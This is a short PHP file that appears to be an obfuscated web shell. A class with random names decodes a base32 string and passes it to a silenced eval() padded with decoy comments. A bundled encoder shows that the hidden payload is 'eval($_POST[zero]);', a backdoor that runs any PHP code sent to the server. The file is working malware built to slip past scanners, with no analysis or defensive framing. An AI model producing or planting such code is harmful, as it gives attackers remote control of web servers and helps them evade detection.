test
<?php
class OtjpY{
        public $ecXoQ = null;
        public $Loobc = null;
        function __construct(){
        $this->ecXoQ = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->Loobc = @Cvlnz($this->ecXoQ);
        $Loobc= $this->Loobc;
        @eval("/****avaLnq****avaLnq****/".$Loobc."/****avaLnq****/");
        }}
new OtjpY();
function Cvlnz($hGbls){
    $VHwoh = '';
    $gOErc = 0;
    $JLhzu = 0;
    for ($i = 0, $j = strlen($hGbls); $i < $j; $i++){
        $gOErc <<= 5;
        if ($hGbls[$i] >= 'a' && $hGbls[$i] <= 'z'){
            $gOErc += (ord($hGbls[$i]) - 97);
        } elseif ($hGbls[$i] >= '2' && $hGbls[$i] <= '7') {
            $gOErc += (24 + $hGbls[$i]);
        } else {
            exit(1);
        }
        $JLhzu += 5;
        while ($JLhzu >= 8){
            $JLhzu -= 8;
            $VHwoh .= chr($gOErc >> $JLhzu);
            $gOErc &= ((1 << $JLhzu) - 1);}}
    return $VHwoh;}
function encoding($str){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $t = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($str); $i < $j; $i++){
    $v <<= 8;
        $v += ord($str[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $t .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $t .= $BASE32_ALPHABET[$v];}
    return $t;}
print(encoding('eval($_POST[zero]);'));
?>

